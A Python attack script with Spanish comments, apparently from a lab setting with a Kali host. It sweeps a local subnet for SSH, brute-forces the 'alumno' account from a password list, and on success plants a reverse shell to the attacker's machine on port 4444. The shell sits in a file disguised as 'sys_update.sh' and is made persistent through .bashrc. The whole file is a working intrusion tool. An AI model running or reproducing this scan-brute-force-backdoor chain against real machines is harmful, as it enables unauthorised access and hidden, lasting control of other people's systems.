import paramiko
import socket

# --- CONFIGURACIÓN ---
RED_BASE = "192.168.1."
USUARIO = "alumno"
DICCIONARIO = "passwords.txt"
IP_KALI = "192.168.1.20" 

def escanear_puerto(ip, puerto):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    result = sock.connect_ex((ip, puerto))
    sock.close()
    return result == 0

def ataque_fuerza_bruta(ip, user, dict_file):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        with open(dict_file, "r") as f:
            passwords = [line.strip() for line in f.readlines()]
    except:
        print("[X] Error: Diccionario no encontrado")
        return None

    for pwd in passwords:
        # Aquí tienes tu visualización de claves de nuevo
        print(f"   [?] Probando en {ip} | Usuario: {user} | Clave: {pwd}")
        try:
            client.connect(ip, username=user, password=pwd, timeout=2)
            print(f"   [!] ¡ÉXITO! Acceso concedido con: {pwd}")
            return client
        except:
            continue
    return None

def instalar_backdoor_final(sesion, ip_destino):
    print(f"[*] Instalando backdoor con desacople total en {ip_destino}...")
    
    # Este comando es la clave:
    # 1. 'setsid' crea una nueva sesión para el proceso (lo separa de la terminal).
    # 2. '&' lo manda al fondo.
    # 3. 'disown' le dice a la terminal que se olvide de él.
    payload = f"echo 'setsid bash -i >& /dev/tcp/{IP_KALI}/4444 0>&1 2>/dev/null &' > ~/.local/sys_update.sh"
    
    sesion.exec_command(payload)
    sesion.exec_command("chmod +x ~/.local/sys_update.sh")
    
    # Importante: Limpiamos el .bashrc antes de añadir la nueva línea para no acumular basura
    sesion.exec_command("sed -i '/sys_update.sh/d' ~/.bashrc")
    sesion.exec_command("echo '~/.local/sys_update.sh' >> ~/.bashrc")
    
    print("[+] Backdoor listo. Ahora la terminal de Ubuntu debería abrirse normal.")

# --- BUCLE ---
print(f"--- PROTOCOLO HEREDERO: {USUARIO} ---")

for i in range(1, 255):
    target = f"{RED_BASE}{i}"
    if target == IP_KALI: continue 
    
    if escanear_puerto(target, 22):
        print(f"\n[+] Objetivo detectado: {target}")
        sesion = ataque_fuerza_bruta(target, USUARIO, DICCIONARIO)
        if sesion:
            instalar_backdoor_final(sesion, target)
            sesion.close()
            break 

print("\n--- OPERACIÓN FINALIZADA ---")
